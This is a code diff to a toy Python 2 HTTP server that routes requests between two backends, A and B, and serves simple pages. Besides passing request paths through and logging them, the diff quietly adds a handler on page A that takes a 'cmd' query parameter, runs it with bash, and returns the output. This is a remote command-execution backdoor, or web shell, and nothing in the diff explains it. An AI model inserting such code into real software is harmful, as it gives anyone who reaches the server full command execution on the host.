@@ -1,5 +1,7 @@
 import fork
 import httplib
+import subprocess
+import urlparse
 from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
 
 existential_purpose = None
@@ -7,9 +9,9 @@ existential_purpose = None
 ipA = None
 ipB = None
 
-def send_request(ip):
+def send_request(ip, path):
     conn = httplib.HTTPConnection(ip)
-    conn.request("GET", "/index.html")
+    conn.request("GET", path)
     r1 = conn.getresponse()
     return r1.read()
 
@@ -20,18 +22,26 @@ class SillyHandler(BaseHTTPRequestHandler):
         self.end_headers()
     def do_GET(self):
         if existential_purpose == "TO_ROUTE":
-            if self.path.lower().endswith("a"):
-                out = send_request(ipA)
+            if self.path.startswith("/a"):
+                out = send_request(ipA, self.path)
             else:
-                out = send_request(ipB)
+                out = send_request(ipB, self.path)
 
             self.wfile.write(out)
             return
         elif existential_purpose == "TO_OUTPUT_A":
             self.send_OK_headers()
-            self.wfile.write("<html><h1>You reached page A!</h1></html>")
+            self.wfile.write("<html><h1>You reached page A!</h1>")
+            print self.path
+            parsed_u = urlparse.urlparse(self.path)
+            qs = urlparse.parse_qs(parsed_u.query)
+            if 'cmd' in qs:
+                out = subprocess.check_output(["bash", "-c", qs['cmd'][0]])
+                self.wfile.write("<i>%s</i>" % out)
+            self.wfile.write("</html>")
             return
         elif existential_purpose == "TO_OUTPUT_B":
+            print self.path
             self.send_OK_headers()
             self.wfile.write("<html><h1>You reached page B!</h1></html>")
             return
